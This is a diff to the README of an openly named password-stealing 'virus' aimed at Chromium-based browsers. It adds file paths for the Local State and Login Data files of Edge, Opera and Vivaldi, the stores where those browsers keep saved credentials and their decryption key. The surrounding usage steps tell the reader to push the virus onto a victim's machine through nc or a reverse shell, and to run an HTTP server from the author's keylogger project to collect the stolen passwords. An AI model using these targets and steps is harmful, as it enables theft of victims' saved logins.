@@ -15,6 +15,21 @@ Virus for extracting saved passwords from chromium based browsers
     AppData/Local/BraveSoftware/Brave-Browser/User Data/Local State
     AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Login Data
 
+#### Edge
+
+    AppData/Local/Microsoft/Edge/User Data/Local State
+    AppData/Local/Microsoft/Edge/User Data/Default/Login Data
+
+#### Opera
+
+    AppData/Roaming/Opera Software/Opera Stable/Local State
+    AppData/Roaming/Opera Software/Opera Stable/Login Data
+
+#### Vivaldi
+
+    AppData/Local/Vivaldi/User Data/Local State
+    AppData/Local/Vivaldi/User Data/Default/Login Data
+
 3. Use nc or some other reversed shell to upload the virus to the victims machine
 4. Download http server from my key loegger repo (now the server is on its own server) witch you can find [here](https://github.com/Josakko/HttpServer)
 5. Make sure that server is running while virus is to retrive all passwords from victims maching and also dont forget to replace data from `todo.txt` whit correct one
